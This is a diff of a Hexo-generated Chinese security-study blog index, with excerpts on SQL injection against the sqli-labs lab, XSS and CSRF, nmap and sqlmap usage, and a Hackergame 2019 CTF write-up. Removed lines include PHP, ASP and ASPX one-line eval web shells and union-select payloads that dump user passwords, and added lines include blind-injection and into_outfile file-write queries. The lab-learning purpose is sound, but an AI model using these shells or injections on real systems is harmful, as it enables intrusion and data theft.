-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>
-
+        <h2 id="特殊字符"><a href="#特殊字符" class="headerlink" title="特殊字符"></a>特殊字符</h2><table>
+<thead>
+<tr>
+<th>特殊字符</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>$</td>
+<td>匹配输入字符串的结尾位置</td>
+</tr>
+<tr>
+<td>()</td>
+<td>标记一个子表达式的开始和结束位置</td>
+</tr>
+<tr>
+<td>*</td>
+<td>匹配前面的子表达式零次或者多次</td>
+</tr>
+<tr>
+<td>+</td>
+<td>匹配前面的子表达式一次或多次</td>
+</tr>
+<tr>
+<td>.</td>
+<td>匹配除\n换行符之外的任何字符</td>
+</tr>
+<tr>
+<td>[</td>
+<td>标记一个中括号表达式的开始</td>
+</tr>
+<tr>
+<td>？</td>
+<td>匹配前面的子表达式的零次或者一次，或指明一个非贪婪限定符</td>
+</tr>
+<tr>
+<td>^</td>
+<td>匹配输入字符串的开始位置，除非在方括号表达式中使用，当该符号在方括号表达式中使用时，表示不接受该方括号表达式中的字符集合</td>
+</tr>
+<tr>
+<td>{</td>
+<td>标记限定符表达式的开始</td>
+</tr>
+<tr>
+<td>|</td>
+<td>指明两项之间的一个选择，即“或”</td>
+</tr>
+</tbody></table>
+        
+          <a class="article-more-a" href="/2020/03/01/正则表达式笔记“/#more">more >></a>
+        
       
 
       
@@ -733,7 +435,7 @@ exit;
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2019/08/25/hello-world/">展开全文 >></a>
+          <a class="article-more-a" href="/2020/03/01/正则表达式笔记“/">展开全文 >></a>
         </p>
       
 
@@ -763,29 +465,29 @@ exit;
 
 
   
-    <article id="post-二进制之ctf基础pwn题" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-xss入门" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2019/07/27/二进制之ctf基础pwn题/">二进制之ctf基础pwn题</a>
+      <a class="article-title" href="/2020/02/27/xss入门/">xss入门</a>
     </h1>
   
 
         
-        <a href="/2019/07/27/二进制之ctf基础pwn题/" class="archive-article-date">
-  	<time datetime="2019-07-27T07:49:20.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-07-27</time>
+        <a href="/2020/02/27/xss入门/" class="archive-article-date">
+  	<time datetime="2020-02-27T02:21:39.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-02-27</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>##做题大体思路<br>首先可以看看是否有后门函数，有的话，直接通过后门函数拿到shell，若没有，可以选择构造后门函数；若后门函数行不通，可以考虑执行shellcode，但前提是程序没有打开NX保护；若程序开启了canare保护，就不能简单的覆盖栈，必须保证canary不变，可以考虑通过字符串格式化漏洞，找到这个canary的位置，然后再进行操作。</p>
+        <h1 id="xss入门"><a href="#xss入门" class="headerlink" title="xss入门"></a>xss入门</h1><h2 id="什么是xss攻击"><a href="#什么是xss攻击" class="headerlink" title="什么是xss攻击"></a>什么是xss攻击</h2><p>xss跨站脚本攻击，是指攻击者通过巧妙的方法将一段脚本内容放入到网页，使用户加载并执行攻击者恶意制造的网页程序。</p>
         
-          <a class="article-more-a" href="/2019/07/27/二进制之ctf基础pwn题/#more">more >></a>
+          <a class="article-more-a" href="/2020/02/27/xss入门/#more">more >></a>
         
       
 
@@ -798,7 +500,7 @@ exit;
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2019/07/27/二进制之ctf基础pwn题/">展开全文 >></a>
+          <a class="article-more-a" href="/2020/02/27/xss入门/">展开全文 >></a>
         </p>
       
 
@@ -828,31 +530,34 @@ exit;
 
 
   
-    <article id="post-pwntools的安装" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-sql宽字节注入学习" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2019/07/23/pwntools的安装/">ubuntu16下 pwntools的安装</a>
+      <a class="article-title" href="/2019/11/17/sql宽字节注入学习/">sql宽字节注入学习</a>
     </h1>
   
 
         
-        <a href="/2019/07/23/pwntools的安装/" class="archive-article-date">
-  	<time datetime="2019-07-23T03:22:12.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-07-23</time>
+        <a href="/2019/11/17/sql宽字节注入学习/" class="archive-article-date">
+  	<time datetime="2019-11-17T02:26:36.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-11-17</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <pre><code>sudo apt-get update
-sudo apt-get install python2.7 python-pip python-dev git libssl-dev libffi-dev build-essentia
-sudo pip install --upgrade pip -i http://pypi.douban.com/simple --trusted-host pypi.douban.com
-sudo pip install --upgrade pwntools  -i http://pypi.douban.com/simple --trusted-host pypi.douban.com</code></pre><p>如果第四条指令报错的话，可以在最后加上 –user 试试；</p>
-
+        <p>首先了解下宽字节注入，宽字节注入主要是源于程序员设置数据库编码与PHP编码设置为不同的两个编码那么就有可能产生宽字节注入</p>
+<p>原理：</p>
+<p>GBK 占用两字节</p>
+<p>ASCII占用一字节</p>
+<p>PHP中编码为GBK，函数执行添加的是ASCII编码（添加的符号为“\”），MYSQL默认字符集是GBK等宽字节字符集。<br>mysql在使用GBK编码的时候，会认为两个字符是一个汉字（前一个ascii码要大于128，才到汉字的范围）</p>
+        
+          <a class="article-more-a" href="/2019/11/17/sql宽字节注入学习/#more">more >></a>
+        
       
 
       
@@ -864,7 +569,7 @@ sudo pip install --upgrade pwntools  -i http://pypi.douban.com/simple --trusted-
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2019/07/23/pwntools的安装/">展开全文 >></a>
+          <a class="article-more-a" href="/2019/11/17/sql宽字节注入学习/">展开全文 >></a>
         </p>
       
 
@@ -894,36 +599,30 @@ sudo pip install --upgrade pwntools  -i http://pypi.douban.com/simple --trusted-
 
 
   
-    <article id="post-sql注入" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-PHP-session反序列化" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2019/07/20/sql注入/">sql注入</a>
+      <a class="article-title" href="/2019/11/03/PHP-session反序列化/">PHP session反序列化</a>
     </h1>
   
 
         
-        <a href="/2019/07/20/sql注入/" class="archive-article-date">
-  	<time datetime="2019-07-20T08:24:08.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-07-20</time>
+        <a href="/2019/11/03/PHP-session反序列化/" class="archive-article-date">
+  	<time datetime="2019-11-03T06:03:32.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-11-03</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>常用的系统函数<br>1.version() –mysql版本<br>2.user() –数据库用户名<br>3.database() – 数据库名<br>4.@@datadir –数据库路径<br>5.@@version_compile_os –操作系统版本<br>字符串连接符号 group_concat(Str1,str2,…) 连接一个组的所有字符串，并以逗号分隔每一条数据</p>
-<hr>
-<p>##sqli-labs-master##</p>
-<p>###Less1###<br>爆所有的数据库名  127.0.0.1/sqli-labs-master/Less-1/?id=-1’ union select 1,group_concat(schema_name),3 from information_schema.schemata%23</p>
-<p>库名：information_schema,�����ݿ�,challenges,dedecmsv57utf8sp2,dvwa,mysql,performance_schema,security,test,wordpress</p>
-<p>爆表名  127.0.0.1/sqli-labs-master/Less-1/?id=-1’ union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=’security’ –+<br>表名：emails,referers,uagents,users</p>
-<p>爆列名：127.0.0.1/sqli-labs-master/Less-1/?id=-1’ union select 1,group_concat(column_name),3 from information_schema.columns where table_name=’users’ –+</p>
-<p>爆数据 127.0.0.1/sqli-labs-master/Less-1/?id=-1’ union select 1,username,password from users where id=2–+</p>
-<p>###Less2</p>
-
+        <p>PHP session可以看做是一个特殊的变量，且该变量是用于存储关于用户会话的信息，或者更改用户会话的设置，需要注意的是，PHP Session 变量存储单一用户的信息，并且对于应用程序中的所有页面都是可用的，且其对应的具体 session 值会存储于服务器端，这也是与 cookie的主要区别，所以seesion 的安全性相对较高。</p>
+        
+          <a class="article-more-a" href="/2019/11/03/PHP-session反序列化/#more">more >></a>
+        
       
 
       
@@ -935,7 +634,7 @@ sudo pip install --upgrade pwntools  -i http://pypi.douban.com/simple --trusted-
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2019/07/20/sql注入/">展开全文 >></a>
+          <a class="article-more-a" href="/2019/11/03/PHP-session反序列化/">展开全文 >></a>
         </p>
       
 
@@ -965,37 +664,30 @@ sudo pip install --upgrade pwntools  -i http://pypi.douban.com/simple --trusted-
 
 
   
-    <article id="post-drops夏令营14" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-序列化与反序列化" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2019/07/20/drops夏令营14/">WEB前端安全-XSS与CSRF</a>
+      <a class="article-title" href="/2019/10/25/序列化与反序列化/">序列化与反序列化</a>
     </h1>
   
 
         
-        <a href="/2019/07/20/drops夏令营14/" class="archive-article-date">
-  	<time datetime="2019-07-20T07:11:35.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-07-20</time>
+        <a href="/2019/10/25/序列化与反序列化/" class="archive-article-date">
+  	<time datetime="2019-10-25T07:21:30.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-10-25</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>XSS<br>  XSS，Cross Site Script，即跨站脚本攻击；XSS攻击通常指黑客通过“HTML”注入篡改了网页，插入了恶意的脚本，从而在浏览网页时，控制用户浏览器的一种攻击。<br>XSS根据效果的不同可以分为以下三类：</p>
-<p>   反射型XSS，也叫做“非持久型XSS”，只是简单的把用户输入的数据“反射”给浏览器；</p>
-<p>   存储型XSS，也叫做“持久型XSS”，会把用户输入的数据“存储在”服务器端。常见的场景是，黑客写下一篇含有恶意JavaScript代码的博客文章，文章发表后，所有访问该博客文章的用户，都会在他们的浏览器中执行这段恶意的JavaScript代码；</p>
-<p>   DOM Based XSS，从效果来说也是反射型XSS，单独划分出了是因为DOM Based XSS的形成原因比较特殊，通过修改页面的DOM节点形成的XSS</p>
-<p>XSS常见危害：<br>劫持用户会话<br>盗取cookie<br>钓鱼欺骗<br>强制弹出广告<br>提升用户权限<br>传播跨站脚本蠕虫</p>
-<hr>
-<p>CSRF<br>CSRF，Cross Site Request Forgery，即跨站点请求伪造；<br>它是一种常见的Web攻击，也是Web安全中最容易被忽略的一种攻击方式<br>它与XSS非常不同，XSS利用站点内的信任用户，而CSRF则通过伪装成受信任用户的请求来利用受信任的网站。</p>
-<p>一般攻击方式为攻击者诱使用户访问了一个页面，就以该用户身份在第三方站点里执行了一次操作</p>
-<p>CSRF攻击的两个重点</p>
-<p>*CSRF的攻击建立在浏览器与web服务器的会话中<br>*欺骗用户访问URL</p>
-
+        <h2 id="php的序列化与反序列化"><a href="#php的序列化与反序列化" class="headerlink" title="php的序列化与反序列化"></a>php的序列化与反序列化</h2><p>通俗的说，序列化就是将变量通过一系列的操作转化为字符串的过程；而反序列化就是其逆过程，将字符串还原成原来的变量；<br>进行序列化与反序列化操作，可以轻松地存储和传输数据。 </p>
+        
+          <a class="article-more-a" href="/2019/10/25/序列化与反序列化/#more">more >></a>
+        
       
 
       
@@ -1007,7 +699,7 @@ sudo pip install --upgrade pwntools  -i http://pypi.douban.com/simple --trusted-
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2019/07/20/drops夏令营14/">展开全文 >></a>
+          <a class="article-more-a" href="/2019/10/25/序列化与反序列化/">展开全文 >></a>
         </p>
       
 
@@ -1037,42 +729,35 @@ sudo pip install --upgrade pwntools  -i http://pypi.douban.com/simple --trusted-
 
 
   
-    <article id="post-drops夏令营11" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-hackergame2019部分题解" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2019/07/20/drops夏令营11/">渗透测试工具</a>
+      <a class="article-title" href="/2019/10/20/hackergame2019部分题解/">hackergame2019部分题解</a>
     </h1>
   
 
         
-        <a href="/2019/07/20/drops夏令营11/" class="archive-article-date">
-  	<time datetime="2019-07-20T06:49:20.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-07-20</time>
+        <a href="/2019/10/20/hackergame2019部分题解/" class="archive-article-date">
+  	<time datetime="2019-10-20T09:48:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-10-20</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>nmap(一款开源免费的网络发现（Network Discovery）和安全审计（Security Auditing）工具)<br>SQLMAP(sqlmap是一个开源的渗透测试工具，可以用来进行自动化检测，利用SQL注入漏洞，获取数据库服务器的权限)<br>burpsuite(BurpSuite 是用于攻击web 应用程序的集成平台，包含了许多工具)<br>hydra(Hydra是一款非常强大的暴力破解工具，它是由著名的黑客组织THC开发的一款开源暴力破解工具)<br>中国菜刀 中国蚁剑（网站管理工具）<br>御剑（一款好用的网站后台扫描工具）<br>nessus（一款漏洞扫描程序）<br>AWVS(一个自动化的web应用程序安全测试工具)</p>
+        <p>##签到题：<br>token后面有一个显示按钮，点击显示，token就出来了，复制，打开题目网址，把token放进框里，发现获取flag的按钮无法点击，F12查看元素，把该按钮的属性<br>disabled=”disabled”改为abled=”disabled”，即可获取flag；</p>
 <hr>
-<p>nmap的基本功能<br>主机发现、端口扫描、版本侦测、操作系统侦测</p>
-<p>常用参数<br>-A ：选项用于使用进攻性方式扫描<br>-T4： 指定扫描过程使用的时序，总有6个级别（0-5），级别越高，扫描速度越快，但也容易被防火墙或IDS检测并屏蔽掉，在网络通讯状况较好的情况下推荐使用T4<br>-oX test.xml： 将扫描结果生成 test.xml 文件<br>-oG test.txt:  将扫描结果生成 test.txt 文件<br>-sn : 只进行主机发现，不进行端口扫描<br>-O : 指定Nmap进行系统版本扫描<br>-sV: 指定让Nmap进行服务版本扫描<br>-p <port ranges>: 扫描指定的端口<br>-sS/sT/sA/sW/sM:指定使用 TCP SYN/Connect()/ACK/Window/Maimon scans的方式来对目标主机进行扫描<br>-sU: 指定使用UDP扫描方式确定目标主机的UDP端口状况<br>-Pn ： 不进行ping扫描<br>-sP :  用ping扫描判断主机是否存活，只有主机存活，nmap才会继续扫描，一般最好不加，因为有的主机会禁止ping<br>-PI :  设置这个选项，让nmap使用真正的ping(ICMP echo请求)来扫描目标主机是否正在运行。<br>-iL 1.txt : 批量扫描1.txt中的目标地址<br>-sL: List Scan 列表扫描，仅将指定的目标的IP列举出来，不进行主机发现<br>-sY/sZ: 使用SCTP INIT/COOKIE-ECHO来扫描SCTP协议端口的开放的情况<br>-sO: 使用IP protocol 扫描确定目标机支持的协议类型<br>-PO : 使用IP协议包探测对方主机是否开启<br>-PE/PP/PM : 使用ICMP echo、 ICMP timestamp、ICMP netmask 请求包发现主机<br>-e eth0：指定使用eth0网卡进行探测<br>-f : –mtu <val>: 指定使用分片、指定数据包的 MTU.<br>-b <ftp relay host>: 使用FTP bounce scan扫描方式<br>-g： 指定发送的端口号<br>-n : 表示不进行DNS解析；<br>-S <ip_address>: 伪装成其他 IP 地址</ip_address></ftp></val></port></p>
-<p>扫描特定主机上的某些端口<br>1.nmap -p 21,22,23,80,443 192.168.1.1 //扫描指定端口<br>2.nmap -p 20-80 192.168.1.1 //扫描指定范围内的端口</p>
+<p>##白与夜：<br>打开题目网址，看到一个cat图片，点开图片，what? flag就这样出来了？<br>flag{4_B14CK_C4T}</p>
 <hr>
-<p>sqlmap<br>参数<br>-p    指定测试参数<br>-b    获取banner<br>–dbs      列举数据库<br>–is-dba     是否是管理员权限<br>–current-db      当前数据库<br>–current-user   当前用户<br>–tables          列举数据库的表名<br>–count               检索所有条目数<br>–columns          获取表的列名<br>–dump          获取表中的数据，包含列<br>–dump-all  转存DBMS数据库所有表项目<br>–level      测试等级(1-5)，默认为1<br>-v                显示详细信息<br>操作步骤<br>读数据库-&gt;读取表-&gt;读取表的列-&gt; 获取内容<br>-D 指定数据库  -T 指定表  -C指定列<br>–dbms==mysql Oracle mysql 指定数据库</p>
-<p>举例<br>爆数据库 sqlmap –u “<a href="http://127.0.0.1/sqli-labs/Less-1/?id=1”" target="_blank" rel="noopener">http://127.0.0.1/sqli-labs/Less-1/?id=1”</a> –dbs<br>当前数据库 sqlmap –u “<a href="http://127.0.0.1/sqli-labs/Less-1/?id=1”" target="_blank" rel="noopener">http://127.0.0.1/sqli-labs/Less-1/?id=1”</a> –current-db<br>列举数据库的表名 sqlmap –u <a href="http://127.0.0.1/sqli-labs/Less-1/?id=1" target="_blank" rel="noopener">http://127.0.0.1/sqli-labs/Less-1/?id=1</a> –D security – tables<br>列出表中的字段 sqlmap –u <a href="http://127.0.0.1/sqli-labs/Less-1/?id=1" target="_blank" rel="noopener">http://127.0.0.1/sqli-labs/Less-1/?id=1</a> –D security –T users –columns<br>列出字段内容 sqlmap –u <a href="http://127.0.0.1/sqli-labs/Less-1?id=1" target="_blank" rel="noopener">http://127.0.0.1/sqli-labs/Less-1?id=1</a> –D security –T users –C password –dump</p>
-<hr>
-<p>Burpsuite</p>
-<p>Proxy代理模块<br> Burpsuite默认使用8080端口作为代理，当然，你也可以自己修改端口号。Proxy——&gt;Options，然后下面可以自己修改代理的端口号，默认是8080<br>这里 Proxy 的 Intercept 这里显示 Intercept is on 表示拦截包开启，所有代理的包都必须先经过burpsuite放行才可以走。<br>如果这里我们选择 intercept is off 的话，那么所有的包都会经过burpsuite，可以在HTTP history看所有经过的包，但是burpsuite不会对经过的包进行拦截。</p>
-<p>Repeater模块(改包，重放)</p>
-<p>抓取包之后，右键 Send to Repeater 发送到重发模块<br>在 Repeater模块，我们可以随意修改数据包。修改完后，点击 go ，就可以发包了。右边就会显示 服务器回的包。</p>
-<hr>
-<p>中国蚁剑 中国菜刀<br> 与一句话木马有关<br>一句话木马就是只需要一行代码的木马，短短一行代码，就能做到和大马相当的功能。为了绕过waf的检测，一句话木马出现了无数中变形，但本质是不变的：木马的函数执行了我们发送的命令。</p>
-<p>简单的一句话木马：<br>PHP：<br>    <?php @eval($_POST['pass']);?><br>Asp：<br>    &lt;%eval request (“pass”)%&gt;<br>Aspx：<br>    &lt;%@ Page Language=”Jscript”%&gt;&lt;%eval(Request.Item[“pass”],”unsafe”);%&gt;</p>
+<p>##信息安全2077：<br>打开题目，提示比赛时间还没开始，<br>Not yet! The competition will start after 21165 days and 54068<br>于是想到了改时间，刚开始有点憨憨的，一直在尝试修改电脑本地的时间日期，一直没改对；哎，怎么没想到，可以用burpsuit直接改包啊！！！<br>刚开始忘了如何打开.txt文件，百度了一下，<br>202.38.93.241:2077/?myfile = fopen(“flag.txt”, “r”)</p>
+<p>抓到的包：<br>GET / HTTP/1.1<br>Host: 202.38.93.241:2077<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,<em>/</em>;q=0.8<br>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0</p>
+<p>.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br>Accept-Encoding: gzip, deflate<br>Connection: keep-alive<br>Upgrade-Insecure-Requests: 1<br>If-Modified-Since: Sun, 13 Oct 2019 13:34:45 GMT<br>If-None-Match: “1570973685.0-1234-3182889908”<br>Cache-Control: max-age=0</p>
+<p>POST /flag.txt HTTP/1.1<br>Host: 202.38.93.241:2077<br>User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) HEICORE/49.1.2623.213 Safari/537.36<br>Accept: <em>/</em><br>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br>Accept-Encoding: gzip, deflate<br>Referer: <a href="http://202.38.93.241:2077/" target="_blank" rel="noopener">http://202.38.93.241:2077/</a><br>If-Unmodified-Since: Sun, 20 Oct 2019 09:02:49 GMT<br>Origin: <a href="http://202.38.93.241:2077" target="_blank" rel="noopener">http://202.38.93.241:2077</a><br>Connection: keep-alive<br>Pragma: no-cache<br>Cache-Control: no-cache<br>Content-Length: 0</p>
+<p>一共两个包，把相应的时间都改了，改为2077年，就可以了；</p>
 
       
 
@@ -1085,7 +770,143 @@ sudo pip install --upgrade pwntools  -i http://pypi.douban.com/simple --trusted-
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2019/07/20/drops夏令营11/">展开全文 >></a>
+          <a class="article-more-a" href="/2019/10/20/hackergame2019部分题解/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-第一道文件上传题" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/10/09/第一道文件上传题/">第一道文件上传题</a>
+    </h1>
+  
+
+        
+        <a href="/2019/10/09/第一道文件上传题/" class="archive-article-date">
+  	<time datetime="2019-10-09T14:45:30.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-10-09</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>前段时间简单了解了一下文件上传，学习了常见的绕过方法，Js绕过文件上传、MIME绕过文件上传、拓展名限制上传、大小写绕过文件上传、点，空格绕过文件上传……<br>本以为学习了这些，就能应对大多数文件上传题目，直到做了这第一道文件上传题，才明白原来学的都只是些皮毛，文件上传，博大精深啊</p>
+        
+          <a class="article-more-a" href="/2019/10/09/第一道文件上传题/#more">more >></a>
+        
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2019/10/09/第一道文件上传题/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-sql注入基础" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/10/03/sql注入基础/">sql注入基础</a>
+    </h1>
+  
+
+        
+        <a href="/2019/10/03/sql注入基础/" class="archive-article-date">
+  	<time datetime="2019-10-03T07:07:13.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-10-03</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>##mysql简单基本用法</p>
+<p>以sqli-labs为例<br>查库：select schema_name from information_schemata<br>查表：select tables_name from information_schema.tables where table_schema=’security’<br>查列：select column_name from information_schema.columns where table_name=’users’<br>查字段：select username,password from security.users</p>
+<p>limit0,1;其中第一位是从第几个开始，比如0代表从第一个开始，而第二位的1代表的就是现实多少个数据。</p>
+<p>order by 列数 对这一列排序，列数不正确就报错，可以用来判断列数，<br>字符串连接符号 group_concat(Str1,str2,…) 连接一个组的所有字符串，并以逗号分隔每一条数据</p>
+<p>concat(‘<del>‘,A,B) ,有分隔符的地连接字符串，<br>查字段时可用 id=-1’union select 1,2,group_concat(concat_ws(‘</del>‘,username,password)) from security.users –+<br>如此使用，可以把表单里的信息全部列出来，不用像以前一样一一列举</p>
+<p>注入时不推荐使用单引号，可用十六进制替代</p>
+<p>1.left()函数：left(database(),1)=’s’    left(a,b)函数从左侧截取a的前b位，正确返回1，错误则返回0；<br>2.regexp函数: select user() regexp ‘r’  user()的结果是root,regexp为匹配root的正则表达式<br>3.like函数: select user() like ‘ro%’ 匹配与regexp相似，多了一个%<br>4.substr(a,b,c) select substr()    substr(a,b,c)从位置b开始，截取a字符串c为长度<br>5.ascii()     将某个字符串转化为ascii值<br>6.chr(数字)或者是ord(‘字母’)   使用python中的两个函数可以判断当前的ascii值是多少</p>
+<p>例：对于security数据库<br>select left(databases(),1)=’s’,前1位是否是s<br>select database() regexp ‘s’  匹配第一个字符是否是s<br>select database() like ‘s%’  匹配第一个字符是否是s<br>select substr((select database()),1,1)=’s’ 匹配第一个字符是否是s<br>select substr((select database()),1,3)=’sec’ 匹配前三个字符是否是sec<br>select ascii(substr((select database()),1,1)) 直接回显115<br>select ascii(substr((select database()),1,1))&gt;110 如果大于110，就会返回1，否则返回0；</p>
+<p>load_file 读取本地文件 select_load(‘文件路径’);<br>into_outfile 写文件<br>select…..into_outfile ‘file_name’<br>可以把被选择的行写入一个文件中。该文件被创建到服务器主机上，因此您必须拥有 FILE 权限，才能使用此语法。file_name 不能是一个已经存在的文件。<br>select ‘mysql is very good’ into_outfile ‘test1.txt’;  文件写的路径为默认路径 PHPTutorial\MySQL\data<br>或者是select ‘crow 666’ into_outfile ‘文件位置’</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2019/10/03/sql注入基础/">展开全文 >></a>
         </p>
       
 
@@ -1117,7 +938,7 @@ sudo pip install --upgrade pwntools  -i http://pypi.douban.com/simple --trusted-
   
   
     <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/3/">Next &raquo;</a>
+      <a class="extend prev" rel="prev" href="/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/3/">Next &raquo;</a>
     </nav>
   
 
@@ -1129,7 +950,7 @@ sudo pip install --upgrade pwntools  -i http://pypi.douban.com/simple --trusted-
   <div class="outer">
     <div id="footer-info">
     	<div class="footer-left">
-    		&copy; 2020 John Doe
+    		&copy; 2021 John Doe
     	</div>
       	<div class="footer-right">
       		<a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/litten/hexo-theme-yilia" target="_blank">Yilia</a> by Litten
